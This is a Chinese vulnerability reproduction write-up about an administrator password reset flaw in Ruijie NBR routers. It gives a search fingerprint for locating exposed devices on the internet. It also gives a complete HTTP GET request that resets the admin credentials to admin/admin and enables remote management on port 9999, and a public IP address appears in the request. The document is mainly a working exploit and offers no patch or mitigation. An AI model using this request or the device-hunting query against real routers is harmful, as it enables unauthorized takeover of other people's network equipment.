# 锐捷NBR系列多款路由器存在管理员密码重置漏洞

**一、漏洞简介**  
<font style="color:rgb(34, 34, 34);">锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。锐捷NBR 路由器系统存在存在管理员密码重置漏洞，攻击者通过漏洞重置密码登录后台</font>  
**二、影响版本**

Ruijie-NBR路由器

**三、资产测绘**

```plain
body="上层网络出现异常，请检查外网线路或联系ISP运营商协助排查"
```

![1717734645117-802010e5-a75c-45f1-8f4c-551281d27278.png](./img/kB-drvIkcHwBbcTn/1717734645117-802010e5-a75c-45f1-8f4c-551281d27278-249342.png)

  
**四、漏洞复现**

```plain
GET /base_network.asp?isbase64=1&reboot=1&shortset=1&time_type=auto&exec_service=ntpc-restart&http_lanport=80&remote_management=1&http_wanport=9999&http_username=admin&http_gname_en=0&http_passwd=admin&_= HTTP/1.1
Host: 
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Referer: 111.59.193.189:9999/index.htm?_1708839153
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wys_userid=; userid=admin; gw_userid=admin,gw_passwd=
Connection: close
```

![1717734727800-954b048d-0b4f-45f0-af30-40f0e26df8af.png](./img/kB-drvIkcHwBbcTn/1717734727800-954b048d-0b4f-45f0-af30-40f0e26df8af-577558.png)

```plain
使用admin/admin登录系统
```

![1717735035159-6a15be6b-d351-4ebd-bce1-f071a0f688c8.png](./img/kB-drvIkcHwBbcTn/1717735035159-6a15be6b-d351-4ebd-bce1-f071a0f688c8-178013.png)



> 更新: 2024-06-24 11:42:26  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/em4uexuiwqtgq0ey>